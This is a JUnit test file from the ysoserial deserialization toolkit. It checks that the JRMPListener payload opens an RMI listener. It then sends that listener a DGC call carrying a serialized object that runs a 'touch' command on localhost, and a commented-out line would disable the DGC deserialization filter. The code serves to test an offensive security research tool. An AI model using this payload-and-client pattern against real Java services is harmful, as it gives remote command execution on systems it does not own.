package ysoserial.test.payloads;

import org.junit.Assert;
import sun.rmi.transport.ObjectTable;
import ysoserial.exploit.JRMPClient;
import ysoserial.payloads.JRMPListener;
import ysoserial.test.CustomTest;
import ysoserial.test.util.Files;
import ysoserial.test.util.ObjectInputFilters;
import ysoserial.test.util.Randomized;

import java.io.File;
import java.rmi.Remote;
import java.util.Random;
import java.util.concurrent.Callable;

public class JRMPListenerTest implements CustomTest, NeedsAddlClasses {
    private final File testFile = Files.getTestFile();

    private final int port = Randomized.randPort();

    @Override
    public void run(Callable<Object> payload) throws Exception {
        Assert.assertFalse("test file shouldn't exist", testFile.exists());

//        ObjectInputFilters.disableDcgFilter();

        // open listener
        Remote res = (Remote) payload.call();

        try {
            // send payload
            JRMPClient.makeDGCCall("localhost", port, new TestHarnessTest.ExecMockSerializable(CommandExecTest.getTouchCmd(testFile.toString())));

            Files.waitForFile(testFile, 1000);

            Assert.assertTrue("test file should exist", testFile.exists());
        } finally {
            // close listener
            // TODO move to postDeserRelease
            ObjectTable.unexportObject(res, true);
        }
    }

    @Override
    public String getPayloadArgs() {
        return "" + port;
    }

    public static void main(String[] args) throws Exception {
//        ObjectInputFilters.disableDcgFilter();
        PayloadsTest.testPayload(JRMPListener.class);
    }

    public Class[] getAddlClasses() {
        // not applicable because of unconfigurable DGC native classloader
        return new Class[] { /* TestHarnessTest.ExecMockSerializable.class */ };
    }

}
